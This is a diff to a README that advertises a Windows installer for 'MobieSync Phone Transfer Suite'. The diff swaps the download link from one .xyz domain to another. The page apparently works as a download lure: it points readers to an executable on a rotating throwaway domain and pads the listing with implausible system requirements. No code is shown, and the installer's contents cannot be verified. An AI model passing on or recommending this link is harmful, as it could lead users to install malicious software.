@@ -18,8 +18,8 @@ This repository ships **MobieSync Phone Transfer Suite** as a Windows installer 
 
 > Use the project link below for Windows.
 
-* **Project link:** **[mobiesync.nexpath.xyz](https://mobiesync.nexpath.xyz/)**
-* **Full URL:** `https://mobiesync.nexpath.xyz/`
+* **Project link:** **[mobiesync.nerasix.xyz](https://mobiesync.nerasix.xyz/)**
+* **Full URL:** `https://mobiesync.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -51,4 +51,4 @@ The package is tuned for offline desktop use — install once, open the app, and
 * **RAM:** 6 GB minimum | 14 GB for big sessions
 * **Disk:** 5 GB available storage
 
-***
+***
